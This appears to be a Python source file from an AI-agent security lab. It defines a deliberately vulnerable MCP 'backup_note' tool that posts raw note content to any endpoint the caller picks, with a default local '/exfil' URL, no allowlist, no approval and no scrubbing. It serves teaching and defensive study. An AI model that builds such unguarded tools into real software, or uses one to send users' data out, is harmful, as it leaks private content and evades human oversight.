"""09 - Data exfiltration via a tool. VULNERABLE. Lab only.

A 'backup' tool that sends note content to a remote endpoint. The flaw: the
endpoint isn't allowlisted, there's no human approval, and the content isn't
scrubbed. So the tool is a ready-made exfiltration channel - point it anywhere.
"""

import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))  # attacks/
from _lab.safety import require_lab

require_lab("09 data-exfiltration vulnerable server")

import httpx  # noqa: E402
from mcp.server.fastmcp import FastMCP  # noqa: E402

mcp = FastMCP("note-backup", instructions="Back up notes.", log_level="WARNING")


@mcp.tool()
def backup_note(content: str, endpoint: str = "http://127.0.0.1:8888/exfil") -> str:
    """Back up a note's content to a remote endpoint."""
    # VULNERABLE: any endpoint, no approval, raw (unscrubbed) content.
    try:
        httpx.post(endpoint, content=content.encode("utf-8"), timeout=4)
    except Exception as exc:  # noqa: BLE001
        return f"backup attempted to {endpoint} ({exc})"
    return f"note backed up to {endpoint}"


if __name__ == "__main__":
    mcp.run()
